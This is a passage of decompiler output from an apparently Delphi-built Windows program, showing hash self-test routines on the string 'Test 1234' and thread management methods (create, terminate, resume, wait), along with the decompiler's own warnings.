  v51 = (_DWORD *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
  v54 = &savedregs;
  v53 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_427610((int)v51, (int)v50, v48, (int)&v40);
  Classes::TStream::SetPosition(0, 0i64);
  v43 = ((__int64 (__fastcall *)(_DWORD *, _DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *))*(_DWORD *)*v51)(
          v51,
          *v51,
          v10,
          ExceptionList);
  if ( v43 >= 4096 )
    v11 = 4096;
  else
    v11 = v43;
  Mem = System::__linkproc__ GetMem(v11);
  v54 = &savedregs;
  v53 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(
    ExceptionList,
    ExceptionList->Next);
  v42 = sub_427470(v51);
  v41 = 0i64;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
  v51 = System::__linkproc__ HandleFinally;
  v50 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v50);
  (*(void (__stdcall **)(_DWORD, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD (__cdecl *)(_DWORD, _DWORD), int (**)()))(*(_DWORD *)System::__linkproc__ HandleFinally + 20))(
    0,
    0,
    v50,
    System::__linkproc__ HandleFinally,
    &savedregs);
  do
  {
    v12 = (*(int (__fastcall **)(_DWORD *, int, int))(*v51 + 12))(v51, Mem, v11);
    v41 += v12;
    ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))ExceptionList->Next->Handler)(
      ExceptionList,
      Mem,
      v12);
  }
  while ( v12 && v41 != v43 );
  __writefsdword(0, (unsigned int)v53);
  savedregs = sub_43C57E;
  return (*(int (__fastcall **)(_DWORD *, _DWORD, _DWORD, _DWORD, _DWORD))(*v51 + 20))(v51, 0, *v51, HIDWORD(v42), v42);
}
// 43C39D: bad sp value at call
// 43C3C0: bad sp value at call
// 43C3F2: bad sp value at call
// 43C433: bad sp value at call
// 43C465: bad sp value at call
// 43C48E: bad sp value at call
// 43C3F2: variable 'v8' is possibly undefined
// 43C4A4: variable 'v10' is possibly undefined
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();
// 43C577: using guessed type _DWORD __cdecl System::__linkproc__ HandleFinally(_DWORD, _DWORD);
// 43C57E: using guessed type int sub_43C57E();
// 43C5A2: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43C729: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43CA28: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43CA44: using guessed type wchar_t aTest1234_1[10];

//----- (0043CA60) --------------------------------------------------------
int __fastcall sub_43CA60(int a1)
{
  nullsub_3(a1);
  return System::__linkproc__ FreeMem(*(_DWORD *)(a1 + 4));
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (0043CA80) --------------------------------------------------------
int __fastcall sub_43CA80(int a1, void *a2, unsigned int a3)
{
  char v6[32]; // [esp+Ch] [ebp-20h] BYREF

  (*(void (__fastcall **)(int, char *))(*(_DWORD *)a1 + 24))(a1, v6);
  if ( a3 <= 0x20 )
    return System::Move(v6, a2, a3);
  else
    return System::Move(v6, a2, 32);
}

//----- (0043CAD0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_43CAD0@<eax>(
        struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>,
        int a2@<ebx>,
        int a3@<edi>,
        int a4@<esi>)
{
  __int32 v4; // eax
  void *v5; // eax
  __int32 v6; // ebx
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // esi
  int v11; // ebx
  _DWORD v13[70]; // [esp-118h] [ebp-240h] BYREF
  char v14[32]; // [esp+0h] [ebp-128h] BYREF
  char v15[32]; // [esp+20h] [ebp-108h] BYREF
  char v16[32]; // [esp+40h] [ebp-E8h] BYREF
  char v17[32]; // [esp+60h] [ebp-C8h] BYREF
  char v18[32]; // [esp+80h] [ebp-A8h] BYREF
  int v19; // [esp+A0h] [ebp-88h] BYREF
  __int64 v20; // [esp+E0h] [ebp-48h]
  __int64 v21; // [esp+E8h] [ebp-40h]
  __int64 v22; // [esp+F0h] [ebp-38h]
  int Mem; // [esp+FCh] [ebp-2Ch]
  int v24; // [esp+100h] [ebp-28h]
  int v25; // [esp+104h] [ebp-24h]
  int v26; // [esp+108h] [ebp-20h]
  int v27; // [esp+10Ch] [ebp-1Ch]
  int v28; // [esp+110h] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *v29; // [esp+114h] [ebp-14h] BYREF
  _DWORD *v30; // [esp+118h] [ebp-10h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+11Ch] [ebp-Ch] BYREF
  void *v32; // [esp+120h] [ebp-8h] BYREF
  int (**v33)(); // [esp+124h] [ebp-4h] BYREF
  int (*savedregs)(); // [esp+128h] [ebp+0h] BYREF

  v13[5] = a2;
  v13[4] = a4;
  v13[3] = a3;
  v33 = 0;
  v32 = 0;
  ExceptionList = a1;
  v13[2] = &savedregs;
  v13[1] = System::__linkproc__ HandleFinally;
  v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_407030((volatile __int32 *)&v33, (__int32)L"Test 1234");
  sub_407030((volatile __int32 *)&v32, (__int32)v33);
  v25 = 5;
  do
  {
    sub_407910((volatile __int32 *)&v32, v32);
    --v25;
  }
  while ( v25 );
  v29 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_407790((int)v33);
  v4 = (__int32)v33;
  if ( v33 )
    v4 = (__int32)*(v33 - 1);
  v27 = 2 * v4;
  v28 = sub_407790((int)v32);
  v5 = v32;
  if ( v32 )
    v5 = (void *)*((_DWORD *)v32 - 1);
  v26 = 2 * (_DWORD)v5;
  v6 = (__int32)v33;
  if ( v33 )
    v6 = (__int32)*(v33 - 1);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(ExceptionList);
  v7 = sub_407790((int)v33);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, __int32))ExceptionList->Next->Handler)(
    ExceptionList,
    v7,
    2 * v6);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, char *))ExceptionList->Next[3].Next)(
    ExceptionList,
    v16);
  qmemcpy(v17, v16, sizeof(v17));
  qmemcpy(v18, v17, sizeof(v18));
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, char *, int))ExceptionList->Next[2].Handler)(
    ExceptionList,
    v18,
    1);
  v24 = 0;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(ExceptionList);
  v8 = sub_407790(0);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))ExceptionList->Next->Handler)(
    ExceptionList,
    v8,
    2 * v24);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, char *))ExceptionList->Next[3].Next)(
    ExceptionList,
    v14);
  qmemcpy(v15, v14, sizeof(v15));
  qmemcpy(v18, v15, sizeof(v18));
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, char *, _DWORD))ExceptionList->Next[2].Handler)(
    ExceptionList,
    v18,
    0);
  v30 = (_DWORD *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
  v33 = &savedregs;
  v32 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_427610((int)v30, (int)v29, v27, (int)&v19);
  Classes::TStream::SetPosition(0, 0i64);
  v22 = ((__int64 (__fastcall *)(_DWORD *, _DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *))*(_DWORD *)*v30)(
          v30,
          *v30,
          v9,
          ExceptionList);
  if ( v22 >= 4096 )
    v10 = 4096;
  else
    v10 = v22;
  Mem = System::__linkproc__ GetMem(v10);
  v33 = &savedregs;
  v32 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(
    ExceptionList,
    ExceptionList->Next);
  v21 = sub_427470(v30);
  v20 = 0i64;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
  v30 = System::__linkproc__ HandleFinally;
  v29 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v29);
  (*(void (__stdcall **)(_DWORD, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD (__cdecl *)(_DWORD, _DWORD), int (**)()))(*(_DWORD *)System::__linkproc__ HandleFinally + 20))(
    0,
    0,
    v29,
    System::__linkproc__ HandleFinally,
    &savedregs);
  do
  {
    v11 = (*(int (__fastcall **)(_DWORD *, int, int))(*v30 + 12))(v30, Mem, v10);
    v20 += v11;
    ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))ExceptionList->Next->Handler)(
      ExceptionList,
      Mem,
      v11);
  }
  while ( v11 && v20 != v22 );
  __writefsdword(0, (unsigned int)v32);
  savedregs = sub_43CD56;
  return (*(int (__fastcall **)(_DWORD *, _DWORD, _DWORD, _DWORD, _DWORD))(*v30 + 20))(v30, 0, *v30, HIDWORD(v21), v21);
}
// 43CB6D: bad sp value at call
// 43CB90: bad sp value at call
// 43CBC6: bad sp value at call
// 43CC07: bad sp value at call
// 43CC3D: bad sp value at call
// 43CC66: bad sp value at call
// 43CC7C: variable 'v9' is possibly undefined
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();
// 43CD4F: using guessed type _DWORD __cdecl System::__linkproc__ HandleFinally(_DWORD, _DWORD);
// 43CD56: using guessed type int sub_43CD56();
// 43CD7A: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43CF05: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43D20C: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43D228: using guessed type wchar_t aTest1234_2[10];

//----- (0043D240) --------------------------------------------------------
int __fastcall sub_43D240(int a1)
{
  nullsub_3(a1);
  return System::__linkproc__ FreeMem(*(_DWORD *)(a1 + 4));
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);

//----- (0043D260) --------------------------------------------------------
int __fastcall sub_43D260(int a1, void *a2, unsigned int a3)
{
  char v6[64]; // [esp+Ch] [ebp-40h] BYREF

  (*(void (__fastcall **)(int, char *))(*(_DWORD *)a1 + 24))(a1, v6);
  if ( a3 <= 0x40 )
    return System::Move(v6, a2, a3);
  else
    return System::Move(v6, a2, 64);
}

//----- (0043D2B0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_43D2B0@<eax>(
        struct _EXCEPTION_REGISTRATION_RECORD *a1@<eax>,
        int a2@<ebx>,
        int a3@<edi>,
        int a4@<esi>)
{
  __int32 v4; // eax
  void *v5; // eax
  __int32 v6; // ebx
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // esi
  int v11; // ebx
  _DWORD v13[134]; // [esp-218h] [ebp-3E0h] BYREF
  char v14[64]; // [esp+0h] [ebp-1C8h] BYREF
  char v15[64]; // [esp+40h] [ebp-188h] BYREF
  char v16[64]; // [esp+80h] [ebp-148h] BYREF
  char v17[64]; // [esp+C0h] [ebp-108h] BYREF
  char v18[64]; // [esp+100h] [ebp-C8h] BYREF
  int v19; // [esp+140h] [ebp-88h] BYREF
  __int64 v20; // [esp+180h] [ebp-48h]
  __int64 v21; // [esp+188h] [ebp-40h]
  __int64 v22; // [esp+190h] [ebp-38h]
  int Mem; // [esp+19Ch] [ebp-2Ch]
  int v24; // [esp+1A0h] [ebp-28h]
  int v25; // [esp+1A4h] [ebp-24h]
  int v26; // [esp+1A8h] [ebp-20h]
  int v27; // [esp+1ACh] [ebp-1Ch]
  int v28; // [esp+1B0h] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *v29; // [esp+1B4h] [ebp-14h] BYREF
  _DWORD *v30; // [esp+1B8h] [ebp-10h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+1BCh] [ebp-Ch] BYREF
  void *v32; // [esp+1C0h] [ebp-8h] BYREF
  int (**v33)(); // [esp+1C4h] [ebp-4h] BYREF
  int (*savedregs)(); // [esp+1C8h] [ebp+0h] BYREF

  v13[5] = a2;
  v13[4] = a4;
  v13[3] = a3;
  v33 = 0;
  v32 = 0;
  ExceptionList = a1;
  v13[2] = &savedregs;
  v13[1] = System::__linkproc__ HandleFinally;
  v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_407030((volatile __int32 *)&v33, (__int32)L"Test 1234");
  sub_407030((volatile __int32 *)&v32, (__int32)v33);
  v25 = 5;
  do
  {
    sub_407910((volatile __int32 *)&v32, v32);
    --v25;
  }
  while ( v25 );
  v29 = (struct _EXCEPTION_REGISTRATION_RECORD *)sub_407790((int)v33);
  v4 = (__int32)v33;
  if ( v33 )
    v4 = (__int32)*(v33 - 1);
  v27 = 2 * v4;
  v28 = sub_407790((int)v32);
  v5 = v32;
  if ( v32 )
    v5 = (void *)*((_DWORD *)v32 - 1);
  v26 = 2 * (_DWORD)v5;
  v6 = (__int32)v33;
  if ( v33 )
    v6 = (__int32)*(v33 - 1);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(ExceptionList);
  v7 = sub_407790((int)v33);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, __int32))ExceptionList->Next->Handler)(
    ExceptionList,
    v7,
    2 * v6);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, char *))ExceptionList->Next[3].Next)(
    ExceptionList,
    v16);
  qmemcpy(v17, v16, sizeof(v17));
  qmemcpy(v18, v17, sizeof(v18));
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, char *, int))ExceptionList->Next[2].Handler)(
    ExceptionList,
    v18,
    1);
  v24 = 0;
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(ExceptionList);
  v8 = sub_407790(0);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))ExceptionList->Next->Handler)(
    ExceptionList,
    v8,
    2 * v24);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, char *))ExceptionList->Next[3].Next)(
    ExceptionList,
    v14);
  qmemcpy(v15, v14, sizeof(v15));
  qmemcpy(v18, v15, sizeof(v18));
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, char *, _DWORD))ExceptionList->Next[2].Handler)(
    ExceptionList,
    v18,
    0);
  v30 = (_DWORD *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
  v33 = &savedregs;
  v32 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_427610((int)v30, (int)v29, v27, (int)&v19);
  Classes::TStream::SetPosition(0, 0i64);
  v22 = ((__int64 (__fastcall *)(_DWORD *, _DWORD, int, struct _EXCEPTION_REGISTRATION_RECORD *))*(_DWORD *)*v30)(
          v30,
          *v30,
          v9,
          ExceptionList);
  if ( v22 >= 4096 )
    v10 = 4096;
  else
    v10 = v22;
  Mem = System::__linkproc__ GetMem(v10);
  v33 = &savedregs;
  v32 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *))ExceptionList->Next->Next)(
    ExceptionList,
    ExceptionList->Next);
  v21 = sub_427470(v30);
  v20 = 0i64;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
  v30 = System::__linkproc__ HandleFinally;
  v29 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v29);
  (*(void (__stdcall **)(_DWORD, _DWORD, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD (__cdecl *)(_DWORD, _DWORD), int (**)()))(*(_DWORD *)System::__linkproc__ HandleFinally + 20))(
    0,
    0,
    v29,
    System::__linkproc__ HandleFinally,
    &savedregs);
  do
  {
    v11 = (*(int (__fastcall **)(_DWORD *, int, int))(*v30 + 12))(v30, Mem, v10);
    v20 += v11;
    ((void (__fastcall *)(struct _EXCEPTION_REGISTRATION_RECORD *, int, int))ExceptionList->Next->Handler)(
      ExceptionList,
      Mem,
      v11);
  }
  while ( v11 && v20 != v22 );
  __writefsdword(0, (unsigned int)v32);
  savedregs = sub_43D536;
  return (*(int (__fastcall **)(_DWORD *, _DWORD, _DWORD, _DWORD, _DWORD))(*v30 + 20))(v30, 0, *v30, HIDWORD(v21), v21);
}
// 43D34D: bad sp value at call
// 43D370: bad sp value at call
// 43D3A6: bad sp value at call
// 43D3E7: bad sp value at call
// 43D41D: bad sp value at call
// 43D446: bad sp value at call
// 43D45C: variable 'v9' is possibly undefined
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();
// 43D52F: using guessed type _DWORD __cdecl System::__linkproc__ HandleFinally(_DWORD, _DWORD);
// 43D536: using guessed type int sub_43D536();
// 43D55A: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43D6E5: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43D9EC: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 43DA08: using guessed type wchar_t aTest1234_3[10];

//----- (0043DB60) --------------------------------------------------------
void __fastcall __noreturn sub_43DB60(int a1, int a2, int a3)
{
  DWORD v3; // ebx
  char v4; // al
  _DWORD v5[3]; // [esp-24h] [ebp-34h] BYREF
  unsigned int v6[3]; // [esp-18h] [ebp-28h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  int (__cdecl *v8)(int, int); // [esp-8h] [ebp-18h]
  int (__usercall *v9)@<eax>(int@<ebx>); // [esp-4h] [ebp-14h]
  void *v10; // [esp+0h] [ebp-10h]
  _DWORD *v11; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v11 = (_DWORD *)a1;
  v9 = (int (__usercall *)@<eax>(int@<ebx>))&savedregs;
  v8 = System::__linkproc__ HandleFinally;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !*(_BYTE *)(a1 + 13) )
  {
    v6[2] = (unsigned int)&savedregs;
    v6[1] = (unsigned int)&loc_43DBC8;
    v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v6);
    v5[2] = &savedregs;
    v5[1] = &loc_43DBB7;
    v5[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    (*(void (__fastcall **)(_DWORD *, _DWORD, int, void *, unsigned int, int *, void *, _DWORD))*v11)(
      v11,
      *v11,
      a3,
      &loc_43DBC8,
      v6[0],
      &savedregs,
      &loc_43DBB7,
      v5[0]);
    __writefsdword(0, (unsigned int)v8);
    v10 = &loc_43DBBE;
    sub_4386C0();
    __writefsdword(0, v6[0]);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v9 = sub_43DC21;
  (*(void (__fastcall **)(_DWORD *, _DWORD))(*v11 + 4))(v11, *v11);
  v3 = v11[4];
  v4 = *((_BYTE *)v11 + 15);
  *((_BYTE *)v11 + 24) = 1;
  if ( v4 )
    sub_405598(v11);
  System::EndThread(v3);
}
// 43DC1A: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);

//----- (0043DC21) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_43DC21@<eax>(int a1@<ebx>)
{
  return a1;
}
// 43DC28: positive sp value 14 has been found
// 43DC21: could not find valid save-restore pair for ebp
// 43DC21: could not find valid save-restore pair for edi
// 43DC21: could not find valid save-restore pair for esi

//----- (0043DC30) --------------------------------------------------------
Classes::TThread *__fastcall sub_43DC30(Classes::TThread *this, char a2, int a3, int a4)
{
  Classes::TThread *v4; // edi
  int v5; // eax
  char v7; // [esp+Fh] [ebp-1h]

  if ( a2 )
    this = (Classes::TThread *)System::__linkproc__ ClassCreate();
  v7 = a2;
  v4 = this;
  *((_DWORD *)this + 9) = a4;
  v5 = sub_4284D0((int)cls_CrossPlatform_TEvent, 1);
  *((_DWORD *)v4 + 7) = v5;
  sub_428530(v5);
  *((_DWORD *)v4 + 8) = sub_4284D0((int)cls_CrossPlatform_TEvent, 1);
  sub_43DD70((int)v4);
  Classes::TThread::TThread(v4, 0);
  if ( v7 )
    System::__linkproc__ AfterConstruction(v4);
  return v4;
}
// 43DC45: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 423150: using guessed type int (*cls_CrossPlatform_TEvent[2])();

//----- (0043DCB0) --------------------------------------------------------
_DWORD *__usercall sub_43DCB0@<eax>(int a1@<edi>)
{
  __int64 v1; // rax
  char v2; // bl
  int v3; // esi
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD *result; // eax

  v1 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v1);
  v3 = v1;
  if ( !*(_BYTE *)(v1 + 24) && !sub_43DD80((Classes::TThread *)v1, *(_DWORD *)(v1 + 36)) )
    TerminateThread(*(HANDLE *)(v3 + 4), 1u);
  sub_43DE90(a1);
  v4 = *(_DWORD **)(v3 + 28);
  *(_DWORD *)(v3 + 28) = 0;
  sub_405598(v4);
  v5 = *(_DWORD **)(v3 + 32);
  *(_DWORD *)(v3 + 32) = 0;
  result = sub_405598(v5);
  if ( v2 > 0 )
    return (_DWORD *)System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0043DD30) --------------------------------------------------------
bool __fastcall sub_43DD30(int a1, int a2)
{
  return (*(unsigned __int8 (__fastcall **)(_DWORD, int))(**(_DWORD **)(a1 + 28) + 8))(*(_DWORD *)(a1 + 28), a2) != 1;
}

//----- (0043DD50) --------------------------------------------------------
BOOL __fastcall sub_43DD50(int a1)
{
  return sub_428520(*(_DWORD *)(a1 + 28));
}

//----- (0043DD60) --------------------------------------------------------
BOOL __fastcall sub_43DD60(int a1)
{
  return sub_428520(*(_DWORD *)(a1 + 32));
}

//----- (0043DD70) --------------------------------------------------------
BOOL __fastcall sub_43DD70(int a1)
{
  return sub_428530(*(_DWORD *)(a1 + 32));
}

//----- (0043DD80) --------------------------------------------------------
bool __fastcall sub_43DD80(Classes::TThread *this, int a2)
{
  Classes::TThread::Terminate(this);
  sub_428520(*((_DWORD *)this + 8));
  return !*((_DWORD *)this + 2)
      || *((_BYTE *)this + 24)
      || (*(unsigned __int8 (__fastcall **)(_DWORD, int))(**((_DWORD **)this + 7) + 8))(*((_DWORD *)this + 7), a2) != 1;
}

//----- (0043DE90) --------------------------------------------------------
_DWORD *__usercall sub_43DE90@<eax>(int a1@<edi>)
{
  __int64 v1; // rax
  char v2; // bl
  int v3; // esi
  int v4; // edi
  _DWORD *result; // eax

  v1 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v1);
  v3 = v1;
  if ( *(_DWORD *)(v1 + 8) && !*(_BYTE *)(v1 + 24) )
  {
    Classes::TThread::Terminate((Classes::TThread *)v1);
    if ( *(_BYTE *)(v3 + 12) )
    {
      v4 = ResumeThread(*(HANDLE *)(v3 + 4));
      sub_43E2B0(v4 >= 0, v4, v3);
      a1 = v4 - 1;
      if ( !a1 )
        *(_BYTE *)(v3 + 14) = 0;
    }
    sub_43E1D0(v3, a1);
  }
  if ( *(_DWORD *)(v3 + 4) )
  {
    CloseHandle_0(*(HANDLE *)(v3 + 4));
    *(_DWORD *)(v3 + 4) = 0;
  }
  sub_405588();
  result = sub_405598(*(_DWORD **)(v3 + 20));
  if ( v2 > 0 )
    return (_DWORD *)System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0043DF20) --------------------------------------------------------
int __fastcall sub_43DF20(int a1)
{
  int v1; // esi
  int v3; // [esp+8h] [ebp-8h] BYREF
  int v4; // [esp+Ch] [ebp-4h] BYREF

  v1 = -1;
  if ( *off_4681D0 )
  {
    v4 = 0;
    if ( !((int (__stdcall *)(_DWORD, int, int *, int, int *))*off_4681D0)(*(_DWORD *)(a1 + 4), 35, &v4, 4, &v3)
      && v3 == 4 )
    {
      return v4;
    }
  }
  return v1;
}
// 4681D0: using guessed type int *off_4681D0;

//----- (0043DF70) --------------------------------------------------------
int __usercall sub_43DF70@<eax>(int a1@<eax>, unsigned __int8 a2@<dl>, int a3@<edi>, int a4@<esi>)
{
  int v5; // edi
  int v6; // esi
  int v7; // ebx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx
  int v12; // ecx
  int v13; // edx
  int v14; // eax
  int v15; // edx
  int v16; // eax
  unsigned int v18[2]; // [esp-Ch] [ebp-40h] BYREF
  int *v19; // [esp-4h] [ebp-38h]
  int v20; // [esp+Ch] [ebp-28h] BYREF
  int v21; // [esp+10h] [ebp-24h] BYREF
  int v22; // [esp+14h] [ebp-20h] BYREF
  int v23; // [esp+18h] [ebp-1Ch] BYREF
  int v24; // [esp+1Ch] [ebp-18h] BYREF
  int v25; // [esp+20h] [ebp-14h] BYREF
  int v26; // [esp+24h] [ebp-10h] BYREF
  int v27; // [esp+28h] [ebp-Ch] BYREF
  DWORD LastError_1; // [esp+2Ch] [ebp-8h]
  int v29; // [esp+30h] [ebp-4h]
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v19 = &savedregs;
  v18[1] = (unsigned int)&loc_43E0D3;
  v18[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v18);
  if ( !(*(_BYTE *)(a1 + 12) | a2) || *(_BYTE *)(a1 + 24) )
  {
    sub_40B51C((int **)off_4680D4, &v20);
    LOBYTE(v15) = 1;
    v16 = unknown_libname_85(cls_CrossPlatform_EThread, v15, v20);
    sub_406340(v16, a1, (int)&savedregs, a3, a4);
  }
  else
  {
    *(_BYTE *)(a1 + 14) = 0;
    *(_BYTE *)(a1 + 12) = 0;
    v5 = sub_43DF20(a1);
    v6 = ResumeThread(*(HANDLE *)(a1 + 4));
    if ( v6 != 1 )
    {
      LastError_1 = GetLastError_1();
      v29 = sub_43DF20(a1);
      Sleep_0(0xBB8u);
      v7 = sub_43DF20(a1);
      sub_40B51C((int **)off_4680D4, &v26);
      sub_415178(&v25, 0, v8, (unsigned int)v6);
      sub_415178(&v24, 0, v9, (unsigned int)v5);
      sub_415178(&v23, 0, v10, (unsigned int)v29);
      sub_415178(&v22, 0, v11, (unsigned int)v7);
      sub_415178(&v21, 0, v12, LastError_1);
      sub_4079F0(&v27, 12);
      LOBYTE(v13) = 1;
      v14 = unknown_libname_85(cls_CrossPlatform_EThread, v13, v27);
      sub_406340(v14, v7, (int)&savedregs, v5, v6);
    }
  }
  __writefsdword(0, v18[0]);
  v19 = (int *)&loc_43E0DA;
  return sub_406CA4((int)&v20, 8);
}
// 43E012: variable 'v8' is possibly undefined
// 43E028: variable 'v9' is possibly undefined
// 43E03F: variable 'v10' is possibly undefined
// 43E055: variable 'v11' is possibly undefined
// 43E06C: variable 'v12' is possibly undefined
// 43E08B: variable 'v13' is possibly undefined
// 43E0AE: variable 'v15' is possibly undefined
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 422F54: using guessed type int (*cls_CrossPlatform_EThread[2])();

//----- (0043E1B0) --------------------------------------------------------
int __usercall sub_43E1B0@<eax>(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  return sub_43DF70(a1, 0, a2, a3);
}

//----- (0043E1D0) --------------------------------------------------------
DWORD __usercall sub_43E1D0@<eax>(int a1@<eax>, int a2@<edi>)
{
  void *v2; // esi
  BOOL ExitCodeThread; // eax
  DWORD ExitCode; // [esp+8h] [ebp-4h] BYREF

  v2 = *(void **)(a1 + 4);
  WaitForSingleObject(v2, 0xFFFFFFFF);
  ExitCode = 0;
  ExitCodeThread = GetExitCodeThread(v2, &ExitCode);
  sub_43E2B0(ExitCodeThread, a2, (int)v2);
  return ExitCode;
}

//----- (0043E210) --------------------------------------------------------
